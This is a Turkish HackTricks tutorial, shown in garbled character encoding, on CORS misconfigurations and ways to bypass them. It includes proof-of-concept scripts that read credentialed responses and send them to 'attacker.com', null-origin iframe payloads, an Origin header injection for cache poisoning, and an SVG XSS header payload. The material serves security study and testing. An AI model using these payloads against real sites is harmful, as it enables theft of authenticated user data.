# CORS - YanlÄ±ÅŸ YapÄ±landÄ±rmalar ve Atlatma

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## CORS Nedir?

Ã‡apraz Kaynak PaylaÅŸÄ±mÄ± (CORS) standardÄ± **sunucularÄ±n varlÄ±klarÄ±na kimin eriÅŸebileceÄŸini** ve **harici kaynaklardan hangi HTTP istek yÃ¶ntemlerinin izinli olduÄŸunu** tanÄ±mlamasÄ±na olanak tanÄ±r.

**AynÄ± kÃ¶ken** politikasÄ±, bir **kaynaÄŸÄ± isteyen sunucu** ile **kaynaÄŸÄ± barÄ±ndÄ±ran sunucunun** aynÄ± protokolÃ¼ (Ã¶r. `http://`), alan adÄ±nÄ± (Ã¶r. `internal-web.com`) ve **portu** (Ã¶r. 80) paylaÅŸmasÄ±nÄ± zorunlu kÄ±lar. Bu politika altÄ±nda, yalnÄ±zca aynÄ± etki alanÄ± ve porttan gelen web sayfalarÄ±na kaynaklara eriÅŸim izinlidir.

`http://normal-website.com/example/example.html` baÄŸlamÄ±nda aynÄ± kÃ¶ken politikasÄ±nÄ±n uygulanmasÄ± aÅŸaÄŸÄ±daki gibi gÃ¶sterilmiÅŸtir:

| EriÅŸilen URL                              | EriÅŸime izin verildi mi?                       |
| ----------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`      | Evet: AynÄ± ÅŸema, alan adÄ± ve port |
| `http://normal-website.com/example2/`     | Evet: AynÄ± ÅŸema, alan adÄ± ve port |
| `https://normal-website.com/example/`     | HayÄ±r: FarklÄ± ÅŸema ve port           |
| `http://en.normal-website.com/example/`   | HayÄ±r: FarklÄ± alan adÄ±                    |
| `http://www.normal-website.com/example/`  | HayÄ±r: FarklÄ± alan adÄ±                    |
| `http://normal-website.com:8080/example/` | HayÄ±r: FarklÄ± port\*                    |

\*Internet Explorer, aynÄ± kÃ¶ken politikasÄ±nÄ± uygularken port numarasÄ±nÄ± dikkate almaz, bu nedenle bu eriÅŸime izin verir.

### `Access-Control-Allow-Origin` BaÅŸlÄ±ÄŸÄ±

Bu baÅŸlÄ±k **Ã§oklu kÃ¶kenlere**, bir **`null`** deÄŸerine veya bir joker **`*`** deÄŸerine izin verebilir. Ancak, **hiÃ§bir tarayÄ±cÄ± Ã§oklu kÃ¶kenleri desteklemez** ve joker `*` kullanÄ±mÄ± **sÄ±nÄ±rlamalara** tabidir. (Joker yalnÄ±z kullanÄ±lmalÄ±dÄ±r ve `Access-Control-Allow-Credentials: true` ile birlikte kullanÄ±mÄ±na izin verilmez.)

Bu baÅŸlÄ±k, tarayÄ±cÄ± tarafÄ±ndan otomatik olarak bir `Origin` baÅŸlÄ±ÄŸÄ± eklenen bir web sitesi tarafÄ±ndan baÅŸlatÄ±lan Ã§apraz etki alanÄ± kaynaÄŸÄ± isteÄŸine sunucu tarafÄ±ndan **verilir**.

### `Access-Control-Allow-Credentials` BaÅŸlÄ±ÄŸÄ±

**VarsayÄ±lan olarak**, Ã§apraz kÃ¶ken istekler, Ã§erezler veya Yetkilendirme baÅŸlÄ±ÄŸÄ± gibi kimlik bilgileri olmadan yapÄ±lÄ±r. Ancak, bir Ã§apraz etki alanÄ± sunucusu, `Access-Control-Allow-Credentials` baÅŸlÄ±ÄŸÄ±nÄ± **`true`** olarak ayarlayarak kimlik bilgileri gÃ¶nderildiÄŸinde yanÄ±tÄ±n okunmasÄ±na izin verebilir.

`true` olarak ayarlandÄ±ÄŸÄ±nda, tarayÄ±cÄ± kimlik bilgilerini (Ã§erezler, yetkilendirme baÅŸlÄ±klarÄ± veya TLS istemci sertifikalarÄ±) iletecektir.
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### CSRF Ã–n uÃ§uÅŸ isteÄŸi

### Ã‡apraz Alan Ä°letiÅŸiminde Ã–n UÃ§uÅŸ Ä°steklerini Anlama

Belirli koÅŸullar altÄ±nda Ã§apraz alan isteÄŸi baÅŸlatÄ±lÄ±rken, Ã¶rneÄŸin **standart olmayan HTTP yÃ¶ntemi** kullanÄ±larak (HEAD, GET, POST dÄ±ÅŸÄ±nda herhangi bir ÅŸey), yeni **baÅŸlÄ±klar** tanÄ±tÄ±larak veya Ã¶zel bir **Content-Type baÅŸlÄ±k deÄŸeri** kullanÄ±larak, bir Ã¶n uÃ§uÅŸ isteÄŸi gerekebilir. Bu Ã¶n hazÄ±rlÄ±k isteÄŸi, **`OPTIONS`** yÃ¶ntemini kullanarak sunucuyu gelecek Ã§apraz kÃ¶kenli isteÄŸin niyetleri hakkÄ±nda bilgilendirir, kullanmayÄ± planladÄ±ÄŸÄ± HTTP yÃ¶ntemlerini ve baÅŸlÄ±klarÄ± iÃ§erir.

**Ã‡apraz KÃ¶ken Kaynak PaylaÅŸÄ±mÄ± (CORS)** protokolÃ¼, bu Ã¶n uÃ§uÅŸ kontrolÃ¼nÃ¼ zorunlu kÄ±lar, istenen Ã§apraz kÃ¶kenli iÅŸlemin uygunluÄŸunu belirleyerek izin verilen yÃ¶ntemleri, baÅŸlÄ±klarÄ± ve kÃ¶kenin gÃ¼venilirliÄŸini doÄŸrular. Bir Ã¶n uÃ§uÅŸ isteÄŸinin gerekli olmadÄ±ÄŸÄ± koÅŸullar hakkÄ±nda detaylÄ± bilgi iÃ§in [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests) tarafÄ±ndan saÄŸlanan kapsamlÄ± kÄ±lavuza baÅŸvurun.

**Ã–n uÃ§uÅŸ isteÄŸinin olmamasÄ±nÄ±n, yanÄ±tÄ±n yetkilendirme baÅŸlÄ±klarÄ±nÄ± taÅŸÄ±ma gerekliliÄŸini ortadan kaldÄ±rmadÄ±ÄŸÄ±nÄ±** unutmamak Ã¶nemlidir. Bu baÅŸlÄ±klar olmadan tarayÄ±cÄ±, Ã§apraz kÃ¶kenli isteÄŸin yanÄ±tÄ±nÄ± iÅŸleme yeteneÄŸinden yoksun kalÄ±r.

AÅŸaÄŸÄ±daki Ã¶rneÄŸi gÃ¶z Ã¶nÃ¼nde bulundurun, bu Ã¶rnek, `PUT` yÃ¶ntemini kullanmayÄ± ve `Special-Request-Header` adÄ±nda Ã¶zel bir baÅŸlÄ±k eklemeyi amaÃ§layan bir Ã¶n uÃ§uÅŸ isteÄŸini gÃ¶stermektedir:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
Sunucu, aÅŸaÄŸÄ±da gÃ¶sterildiÄŸi gibi kabul edilen yÃ¶ntemleri, izin verilen kaynaÄŸÄ± ve diÄŸer CORS politikasÄ± ayrÄ±ntÄ±larÄ±nÄ± belirten baÅŸlÄ±klar dÃ¶ndÃ¼rebilir:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* **`Access-Control-Allow-Headers`**: Bu baÅŸlÄ±k, gerÃ§ek istek sÄ±rasÄ±nda hangi baÅŸlÄ±klarÄ±n kullanÄ±labileceÄŸini belirtir. Sunucu tarafÄ±ndan, istemciden gelen isteklerde izin verilen baÅŸlÄ±klarÄ± gÃ¶stermek iÃ§in ayarlanÄ±r.
* **`Access-Control-Expose-Headers`**: Bu baÅŸlÄ±k aracÄ±lÄ±ÄŸÄ±yla sunucu, basit yanÄ±t baÅŸlÄ±klarÄ±nÄ±n yanÄ± sÄ±ra yanÄ±tÄ±n bir parÃ§asÄ± olarak hangi baÅŸlÄ±klarÄ±n aÃ§Ä±klanabileceÄŸi konusunda istemciyi bilgilendirir.
* **`Access-Control-Max-Age`**: Bu baÅŸlÄ±k, bir Ã¶n uÃ§uÅŸ isteÄŸinin sonuÃ§larÄ±nÄ±n ne kadar sÃ¼reyle Ã¶nbelleÄŸe alÄ±nabileceÄŸini belirtir. Sunucu, Ã¶n uÃ§uÅŸ isteÄŸi tarafÄ±ndan dÃ¶ndÃ¼rÃ¼len bilgilerin ne kadar sÃ¼reyle yeniden kullanÄ±labileceÄŸini saniye cinsinden belirler.
* **`Access-Control-Request-Headers`**: Ã–n uÃ§uÅŸ isteklerinde kullanÄ±lan bu baÅŸlÄ±k, istemci tarafÄ±ndan gerÃ§ek istekte hangi HTTP baÅŸlÄ±klarÄ±nÄ±n kullanÄ±lacaÄŸÄ±nÄ± sunucuya bildirmek iÃ§in ayarlanÄ±r.
* **`Access-Control-Request-Method`**: Bu baÅŸlÄ±k da Ã¶n uÃ§uÅŸ isteklerinde kullanÄ±lÄ±r ve istemci tarafÄ±ndan gerÃ§ek istekte hangi HTTP yÃ¶nteminin kullanÄ±lacaÄŸÄ±nÄ± belirtmek iÃ§in ayarlanÄ±r.
* **`Origin`**: Bu baÅŸlÄ±k tarayÄ±cÄ± tarafÄ±ndan otomatik olarak ayarlanÄ±r ve Ã§apraz kÃ¶ken isteÄŸinin kÃ¶kenini gÃ¶sterir. Sunucu, CORS politikasÄ±na dayanarak gelen isteÄŸin izin verilip verilmeyeceÄŸini deÄŸerlendirmek iÃ§in bunu kullanÄ±r.

Genellikle (iÃ§erik tÃ¼rÃ¼ne ve ayarlanan baÅŸlÄ±klara baÄŸlÄ± olarak) **GET/POST isteÄŸinde Ã¶n uÃ§uÅŸ isteÄŸi gÃ¶nderilmez** (isteÄŸi **doÄŸrudan** gÃ¶nderilir), ancak yanÄ±tÄ±n **baÅŸlÄ±klarÄ±nÄ±/gÃ¶vdesine eriÅŸmek istiyorsanÄ±z**, buna izin veren bir _Access-Control-Allow-Origin_ baÅŸlÄ±ÄŸÄ± iÃ§ermelidir.\
**Bu nedenle, CORS CSRF'ye karÅŸÄ± koruma saÄŸlamaz (ancak faydalÄ± olabilir).**

### **Yerel AÄŸ Ä°stekleri Ã–n UÃ§uÅŸ Ä°steÄŸi**

1. **`Access-Control-Request-Local-Network`**: Bu baÅŸlÄ±k, istemcinin isteÄŸine dahil edilir ve sorgunun yerel aÄŸ kaynaÄŸÄ±na yÃ¶nelik olduÄŸunu belirtir. Sunucuya, isteÄŸin yerel aÄŸdan geldiÄŸini bildirmek iÃ§in bir iÅŸaret olarak hizmet eder.
2. **`Access-Control-Allow-Local-Network`**: YanÄ±t olarak, sunucular istenen kaynaÄŸÄ±n yerel aÄŸ dÄ±ÅŸÄ±ndaki varlÄ±klarla paylaÅŸÄ±lmasÄ±na izin verildiÄŸini iletmek iÃ§in bu baÅŸlÄ±ÄŸÄ± kullanÄ±r. FarklÄ± aÄŸ sÄ±nÄ±rlarÄ± arasÄ±nda kaynaklarÄ±n paylaÅŸÄ±lmasÄ±na yeÅŸil Ä±ÅŸÄ±k yakarak, kontrollÃ¼ eriÅŸimi saÄŸlarken gÃ¼venlik protokollerini korur.

**Yerel aÄŸ isteÄŸine izin veren geÃ§erli bir yanÄ±tÄ±n**, ayrÄ±ca yanÄ±tta `Access-Controls-Allow-Local_network: true` baÅŸlÄ±ÄŸÄ±nÄ± iÃ§ermesi gerekir:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Linux'un **0.0.0.0** IP'sinin localhost'a eriÅŸmek iÃ§in gereksinimleri **atlamak** iÃ§in Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± unutmayÄ±n, Ã§Ã¼nkÃ¼ bu IP adresi "yerel" olarak kabul edilmez.

AyrÄ±ca, **Yerel AÄŸ gereksinimlerini atlamak** mÃ¼mkÃ¼ndÃ¼r, eÄŸer **yerel bir uÃ§ noktanÄ±n genel IP adresini** kullanÄ±yorsanÄ±z (Ã¶rneÄŸin yÃ¶nlendiricinin genel IP'si). Ã‡Ã¼nkÃ¼ birkaÃ§ durumda, hatta **genel IP'ye** eriÅŸiliyorsa, eÄŸer **yerel aÄŸdan** eriÅŸiliyorsa, eriÅŸim saÄŸlanacaktÄ±r.
{% endhint %}

## SÃ¶mÃ¼rÃ¼lebilir yanlÄ±ÅŸ yapÄ±landÄ±rmalar

`Access-Control-Allow-Credentials` ayarÄ±nÄ±n **`true`** olarak ayarlanmasÄ±nÄ±n Ã§oÄŸu **gerÃ§ek saldÄ±rÄ±lar** iÃ§in bir Ã¶nkoÅŸul olduÄŸu gÃ¶zlemlenmiÅŸtir. Bu ayar, tarayÄ±cÄ±nÄ±n kimlik bilgilerini gÃ¶ndermesine ve yanÄ±tÄ± okumasÄ±na izin verir, saldÄ±rÄ±nÄ±n etkinliÄŸini artÄ±rÄ±r. Bu olmadan, tarayÄ±cÄ±nÄ±n isteÄŸi yapmasÄ±nÄ± saÄŸlamak yerine kendiniz yapmanÄ±n faydasÄ± azalÄ±r, Ã§Ã¼nkÃ¼ bir kullanÄ±cÄ±nÄ±n Ã§erezlerini kullanmak olanaksÄ±z hale gelir.

### Ä°stisna: AÄŸ Konumunun Kimlik DoÄŸrulamasÄ± Olarak SÃ¶mÃ¼rÃ¼lmesi

KurbanÄ±n aÄŸ konumunun kimlik doÄŸrulamasÄ± olarak kullanÄ±lmasÄ±na izin veren bir istisna vardÄ±r. Bu, kurbanÄ±n tarayÄ±cÄ±sÄ±nÄ±n bir proxy olarak kullanÄ±lmasÄ±na olanak tanÄ±r, IP tabanlÄ± kimlik doÄŸrulamayÄ± atlayarak iÃ§ aÄŸ uygulamalarÄ±na eriÅŸimi saÄŸlar. Bu yÃ¶ntem, DNS rebinding ile benzer etkilere sahip olmasÄ±na raÄŸmen, daha basit bir ÅŸekilde sÃ¶mÃ¼rÃ¼lebilir.

### `Access-Control-Allow-Origin` Ä°Ã§inde `Origin` YansÄ±tÄ±lmasÄ±

`Origin` baÅŸlÄ±ÄŸÄ±nÄ±n deÄŸerinin `Access-Control-Allow-Origin` iÃ§inde yansÄ±tÄ±ldÄ±ÄŸÄ± gerÃ§ek dÃ¼nya senaryosu, bu baÅŸlÄ±klarÄ±n birleÅŸtirilmesine yÃ¶nelik kÄ±sÄ±tlamalar nedeniyle teorik olarak olasÄ± deÄŸildir. Bununla birlikte, CORS'u birden fazla URL iÃ§in etkinleÅŸtirmek isteyen geliÅŸtiriciler, `Access-Control-Allow-Origin` baÅŸlÄ±ÄŸÄ±nÄ± `Origin` baÅŸlÄ±ÄŸÄ±nÄ±n deÄŸerini kopyalayarak dinamik olarak oluÅŸturabilir. Bu yaklaÅŸÄ±m, Ã¶zellikle bir saldÄ±rganÄ±n geÃ§erlilik mantÄ±ÄŸÄ±nÄ± aldatarak meÅŸru gÃ¶rÃ¼nmesi iÃ§in tasarlanmÄ±ÅŸ bir alan adÄ± kullandÄ±ÄŸÄ±nda, gÃ¼venlik aÃ§Ä±klarÄ±na neden olabilir.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### `null` Origin'un SÃ¶mÃ¼rÃ¼lmesi

YÃ¶nlendirmeler veya yerel HTML dosyalarÄ± gibi durumlar iÃ§in belirlenen `null` kÃ¶keni, benzersiz bir konuma sahiptir. BazÄ± uygulamalar, yerel geliÅŸtirmeyi kolaylaÅŸtÄ±rmak iÃ§in bu kÃ¶keni beyaz listeye alÄ±r ve yanlÄ±ÅŸlÄ±kla herhangi bir web sitesinin, bir kum havuzu iÃ§indeki iframe aracÄ±lÄ±ÄŸÄ±yla `null` kÃ¶kenini taklit etmesine izin vererek CORS kÄ±sÄ±tlamalarÄ±nÄ± atlar.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### DÃ¼zenli Ä°fade Atlatma Teknikleri

Bir alan adÄ± beyaz listesiyle karÅŸÄ±laÅŸÄ±ldÄ±ÄŸÄ±nda, saldÄ±rganÄ±n alan adÄ±nÄ± beyaz listeli bir alan adÄ±na eklemek veya alt alan adÄ± ele geÃ§irme gÃ¼venlik aÃ§Ä±klarÄ±nÄ± sÃ¶mÃ¼rmek gibi atlatma fÄ±rsatlarÄ±nÄ± test etmek hayati Ã¶nem taÅŸÄ±r. AyrÄ±ca, alan adÄ± doÄŸrulamasÄ± iÃ§in kullanÄ±lan dÃ¼zenli ifadeler, alan adÄ± adlandÄ±rma kurallarÄ±ndaki ince detaylarÄ± gÃ¶z ardÄ± edebilir ve daha fazla atlatma fÄ±rsatÄ± sunabilir.

### GeliÅŸmiÅŸ DÃ¼zenli Ä°fade AtlatmalarÄ±

DÃ¼zenli ifade desenleri genellikle alfasayÄ±sal, nokta (.), ve kÄ±sa Ã§izgi (-) karakterlerine odaklanÄ±rken, diÄŸer olasÄ±lÄ±klarÄ± gÃ¶z ardÄ± edebilir. Ã–rneÄŸin, tarayÄ±cÄ±lar ve dÃ¼zenli ifade desenleri tarafÄ±ndan farklÄ± yorumlanan karakterleri iÃ§eren bir alan adÄ±, gÃ¼venlik kontrollerini atlatmak iÃ§in kullanÄ±labilir. Safari, Chrome ve Firefox'un alt alanlardaki alt Ã§izgi karakterlerini ele alÄ±ÅŸ ÅŸekilleri, bu tÃ¼r farklÄ±lÄ±klarÄ±n alan adÄ± doÄŸrulama mantÄ±ÄŸÄ±nÄ± atlatmak iÃ§in nasÄ±l sÃ¶mÃ¼rÃ¼lebileceÄŸini gÃ¶sterir.

**Bu atlatma kontrolÃ¼nÃ¼n daha fazla bilgi ve ayarlarÄ± iÃ§in:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **ve** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1\*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (153).png>)

### Bir Alt Alan Ä°Ã§inde XSS'ten

GeliÅŸtiriciler genellikle, bilgi istemek iÃ§in izin verilen alan adlarÄ±nÄ± beyaz listeye alarak CORS sÃ¶mÃ¼rÃ¼sÃ¼ne karÅŸÄ± koruyucu mekanizmalarÄ± uygularlar. Bu Ã¶nlemlere raÄŸmen, sistemin gÃ¼venliÄŸi kusursuz deÄŸildir. Beyaz listeli alan adlarÄ± iÃ§inde bile tek bir savunmasÄ±z alt alanÄ±n bulunmasÄ±, XSS (Cross-Site Scripting) gibi diÄŸer gÃ¼venlik aÃ§Ä±klarÄ±ndan dolayÄ± CORS sÃ¶mÃ¼rÃ¼sÃ¼ne kapÄ± aÃ§abilir.

Ã–rneÄŸin, `requester.com` adlÄ± bir alan adÄ±nÄ±n, baÅŸka bir alan adÄ± olan `provider.com`'dan kaynaklara eriÅŸime izin verildiÄŸi bir senaryoyu dÃ¼ÅŸÃ¼nelim. Sunucu tarafÄ± yapÄ±landÄ±rmasÄ± ÅŸÃ¶yle gÃ¶rÃ¼nebilir:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
Bu kurulumda, `requester.com` alt alan adlarÄ±nÄ±n hepsine eriÅŸim izni verilmiÅŸtir. Ancak, bir alt alan adÄ±, Ã¶rneÄŸin `sub.requester.com`, bir XSS zafiyeti ile tehlikeye dÃ¼ÅŸerse, bir saldÄ±rgan bu zayÄ±flÄ±ÄŸÄ± kullanabilir. Ã–rneÄŸin, `sub.requester.com`'a eriÅŸimi olan bir saldÄ±rgan, XSS zafiyetini kullanarak CORS politikalarÄ±nÄ± atlayabilir ve `provider.com` Ã¼zerindeki kaynaklara kÃ¶tÃ¼ niyetli bir ÅŸekilde eriÅŸebilir.

### **Sunucu tarafÄ± Ã¶nbellek zehirlenmesi**

[**Bu araÅŸtÄ±rmadan**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

Sunucu tarafÄ± Ã¶nbellek zehirlenmesini HTTP baÅŸlÄ±ÄŸÄ± enjeksiyonu yoluyla sÃ¶mÃ¼rerek, depolanan Cross-Site Scripting (XSS) zafiyetinin tetiklenebileceÄŸi mÃ¼mkÃ¼ndÃ¼r. Bu senaryo, bir uygulamanÄ±n `Origin` baÅŸlÄ±ÄŸÄ±nÄ± yasaklÄ± karakterler iÃ§in temizlemediÄŸinde ortaya Ã§Ä±kar ve Ã¶zellikle Internet Explorer ve Edge kullanÄ±cÄ±larÄ± iÃ§in bir zafiyet oluÅŸturur. Bu tarayÄ±cÄ±lar (0x0d) 'i meÅŸru bir HTTP baÅŸlÄ±k terminatorÃ¼ olarak iÅŸler ve HTTP baÅŸlÄ±ÄŸÄ± enjeksiyonu zafiyetlerine yol aÃ§ar.

AÅŸaÄŸÄ±daki isteÄŸi dÃ¼ÅŸÃ¼nÃ¼n, burada `Origin` baÅŸlÄ±ÄŸÄ± manipÃ¼le edilmiÅŸtir:
```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer ve Edge yanÄ±tÄ± ÅŸu ÅŸekilde yorumlar:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
Bu zafiyeti doÄŸrudan sÃ¶mÃ¼rmek iÃ§in bir web tarayÄ±cÄ±sÄ±nÄ±n hatalÄ± bir baÅŸlÄ±k gÃ¶ndermesi mÃ¼mkÃ¼n olmasa da, Burp Suite gibi araÃ§lar kullanÄ±larak elle oluÅŸturulmuÅŸ bir istek ile sunucu tarafÄ±nda Ã¶nbelleÄŸe alÄ±nan yanÄ±tÄ±n baÅŸkalarÄ±na hizmet edilmesine neden olabilir. OluÅŸturulan payload, sayfanÄ±n karakter setini UTF-7'ye deÄŸiÅŸtirmeyi amaÃ§lar. UTF-7, belirli baÄŸlamlarda betik olarak yÃ¼rÃ¼tÃ¼lebilecek ÅŸekilde karakterleri kodlayabilme yeteneÄŸi nedeniyle XSS zafiyetleri ile sÄ±kÃ§a iliÅŸkilendirilen bir karakter kodlamasÄ±dÄ±r.

Daha fazla bilgi iÃ§in depolanan XSS zafiyetlerine bakÄ±n [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Not**: Ã–zellikle sunucu tarafÄ± Ã¶nbellek zehirlenmesi yoluyla HTTP baÅŸlÄ±k enjeksiyonu zafiyetlerinin sÃ¶mÃ¼rÃ¼lmesi, HTTP baÅŸlÄ±klarÄ± da dahil olmak Ã¼zere tÃ¼m kullanÄ±cÄ± tarafÄ±ndan saÄŸlanan girdilerin doÄŸrulanmasÄ± ve temizlenmesinin kritik Ã¶nemini vurgular. Bu tÃ¼r zafiyetleri Ã¶nlemek iÃ§in giriÅŸ doÄŸrulamasÄ±nÄ± iÃ§eren saÄŸlam bir gÃ¼venlik modeli kullanÄ±n.

### **Ä°stemci TarafÄ± Ã–nbellek Zehirlenmesi**

[**Bu araÅŸtÄ±rmadan**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

Bu senaryoda, uygun kodlama olmadan Ã¶zel bir HTTP baÅŸlÄ±ÄŸÄ±nÄ±n iÃ§eriÄŸini yansÄ±tan bir web sayfasÄ± Ã¶rneÄŸi gÃ¶zlemlenir. Ã–zellikle, web sayfasÄ±, `X-User-id` baÅŸlÄ±ÄŸÄ±nda bulunan iÃ§eriÄŸi geri yansÄ±tÄ±r; bu iÃ§erik kÃ¶tÃ¼ amaÃ§lÄ± JavaScript iÃ§erebilir. BaÅŸlÄ±k, yÃ¼klenirken JavaScript kodunu yÃ¼rÃ¼tmek iÃ§in tasarlanmÄ±ÅŸ bir SVG resim etiketi iÃ§erdiÄŸinde gÃ¶sterildiÄŸi gibi.

Ã‡apraz Kaynak PaylaÅŸÄ±mÄ± (CORS) politikalarÄ± Ã¶zel baÅŸlÄ±klarÄ±n gÃ¶nderilmesine izin verir. Ancak, CORS kÄ±sÄ±tlamalarÄ± nedeniyle tarayÄ±cÄ± tarafÄ±ndan yanÄ±tÄ±n doÄŸrudan iÅŸlenmemesi durumunda, bÃ¶yle bir enjeksiyonun faydasÄ± sÄ±nÄ±rlÄ± gibi gÃ¶rÃ¼nebilir. Kritik nokta, tarayÄ±cÄ±nÄ±n Ã¶nbellek davranÄ±ÅŸÄ±nÄ± dÃ¼ÅŸÃ¼nÃ¼rken ortaya Ã§Ä±kar. `Vary: Origin` baÅŸlÄ±ÄŸÄ± belirtilmediÄŸinde, kÃ¶tÃ¼ amaÃ§lÄ± yanÄ±tÄ±n tarayÄ±cÄ± tarafÄ±ndan Ã¶nbelleÄŸe alÄ±nmasÄ± mÃ¼mkÃ¼n hale gelir. SonuÃ§ olarak, bu Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ yanÄ±t, URL'ye doÄŸrudan gezinildiÄŸinde doÄŸrudan iÅŸlenebilir, baÅŸlangÄ±Ã§taki istekte doÄŸrudan iÅŸlenmesi gerekmeksizin. Bu mekanizma, istemci tarafÄ± Ã¶nbelleÄŸini kullanarak saldÄ±rÄ±nÄ±n gÃ¼venilirliÄŸini artÄ±rÄ±r.

Bu saldÄ±rÄ±yÄ± gÃ¶stermek iÃ§in, bir JavaScript Ã¶rneÄŸi saÄŸlanmÄ±ÅŸtÄ±r; bir JSFiddle gibi bir web sayfasÄ±nÄ±n ortamÄ±nda yÃ¼rÃ¼tÃ¼lmek Ã¼zere tasarlanmÄ±ÅŸtÄ±r. Bu betik basit bir eylem gerÃ§ekleÅŸtirir: belirtilen URL'ye kÃ¶tÃ¼ amaÃ§lÄ± JavaScript iÃ§eren Ã¶zel bir baÅŸlÄ±k iÃ§eren bir istek gÃ¶nderir. BaÅŸarÄ±lÄ± istek tamamlandÄ±ÄŸÄ±nda, hedef URL'ye gitmeye Ã§alÄ±ÅŸÄ±r ve yanÄ±tÄ±n `Vary: Origin` baÅŸlÄ±ÄŸÄ±nÄ±n doÄŸru ÅŸekilde iÅŸlenmemesi durumunda enjekte edilen betiÄŸin yÃ¼rÃ¼tÃ¼lmesini tetikleyebilir.

Ä°ÅŸte bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±lan JavaScript'in Ã¶zetlenmiÅŸ bir aÃ§Ä±klamasÄ±:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Atlat

### XSSI (Cross-Site Script Inclusion) / JSONP

